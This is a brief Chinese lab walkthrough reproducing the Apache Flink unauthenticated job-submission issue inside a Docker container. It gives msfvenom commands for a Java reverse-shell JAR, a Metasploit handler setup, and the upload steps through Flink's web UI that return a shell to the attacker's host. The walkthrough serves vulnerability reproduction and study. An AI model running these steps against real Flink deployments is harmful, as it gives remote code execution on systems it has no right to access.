
# Apache-Flink未授权访问漏洞

环境搭建：

docker pull scxiaotan2/flink3.1.2:weishouquan   #拉取镜像

docker run -it  scxiaotan2/flink3.1.2:weishouquan  /bin/bash       #启动shell

./start.sh     #启动根目录下的服务

netstat -tlnp      #可以看到8081端口启用了

ifconfig      #查看当前IP地址 比如地址为172.17.0.2  可以访问http://172.17.0.2:8081


# Apache-Flink漏洞复现

Kali linux 下运行msfvenom

生成payload

msfvenom -p java/shell_reverse_tcp LHOST=VPS LHOST LPORT=VPS LPORT -f jar >test.jar

监听端口

msfconsole 

>use exploits/multi/handler

>set PAYLOAD java/meterpreter/reverse_tcp

>set LHOST  192.168.0.4  # 执行ifconfig  查看当前ip是多少这里就写多少

>exploit -j

# 上传文件

访问docker 下flink 环境

http://172.17.0.2:8081

点击 Submit New Job --> Add New-->选择刚刚生成的jar包-->上传成功后点击Submit  即可在msf下反弹一个shell
